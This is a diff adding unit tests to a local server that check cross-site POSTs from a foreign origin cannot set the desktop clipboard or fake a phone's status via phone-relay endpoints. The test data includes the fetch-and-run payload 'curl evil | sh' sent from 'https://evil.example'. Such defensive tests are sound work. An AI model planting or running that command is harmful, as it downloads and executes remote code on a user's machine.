@@ -162,3 +162,56 @@ class PageRefusesFrames(PhoneRelayNeedsTheKey):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class PhoneRelayRefusesAForeignPage(unittest.TestCase):
+    """Without an api_key (the default on 127.0.0.1), a page on any site could send a "simple" cross-site text/plain
+    POST to /api/phone/clipboard and set the desktop clipboard, or fake the phone's heartbeat and results."""
+
+    @classmethod
+    def setUpClass(cls):
+        tok = ByteTokenizer()
+        cls.svc = Service(MockEngine(tok, "ok", max_context=4096), tok, ChatTemplate(ROOT / "serve/chat_template.jinja"))
+        cls.httpd = serve(cls.svc, port=0)
+        cls.host = f"127.0.0.1:{cls.httpd.server_address[1]}"
+
+    @classmethod
+    def tearDownClass(cls):
+        cls.httpd.shutdown()
+        cls.httpd.server_close()
+
+    def setUp(self):
+        server.PHONE_BRIDGE = server.PhoneBridge()
+
+    def post(self, path, body, origin=None, ctype="text/plain;charset=UTF-8"):
+        headers = {"Content-Type": ctype}
+        if origin:
+            headers["Origin"] = origin
+        req = urllib.request.Request(f"http://{self.host}{path}", method="POST", headers=headers,
+                                     data=json.dumps(body).encode())
+        try:
+            with urllib.request.urlopen(req, timeout=10) as r:
+                return r.status
+        except urllib.error.HTTPError as e:
+            with e:
+                return e.code
+
+    def test_a_foreign_page_cannot_set_the_clipboard_or_fake_the_phone(self):
+        from unittest import mock
+        with mock.patch.object(server.subprocess, "run") as run:
+            for path, body in (("/api/phone/clipboard", {"text": "curl evil | sh"}), ("/api/phone/status", {}),
+                               (server.PHONE_CLIPBOARD_PATH, {"text": "curl evil | sh"})):
+                with self.subTest(path=path):
+                    self.assertEqual(self.post(path, body, origin="https://evil.example"), 403)
+            time.sleep(0.2)
+            run.assert_not_called()
+        self.assertFalse(server.PHONE_BRIDGE.get_status()["connected"])
+        self.assertEqual(server.PHONE_BRIDGE.clipboard["text"], "")
+
+    def test_the_own_page_and_the_app_still_work(self):
+        from unittest import mock
+        with mock.patch.object(server.subprocess, "run"):
+            self.assertEqual(self.post("/api/phone/status", {}, origin=f"http://{self.host}"), 200)
+            self.assertEqual(self.post(server.PHONE_CLIPBOARD_PATH, {"text": "hi", "updated_ms": "soon"},
+                                       ctype="application/json"), 200)        # the Android app: no Origin
+        self.assertEqual(server.PHONE_BRIDGE.clipboard["text"], "hi")
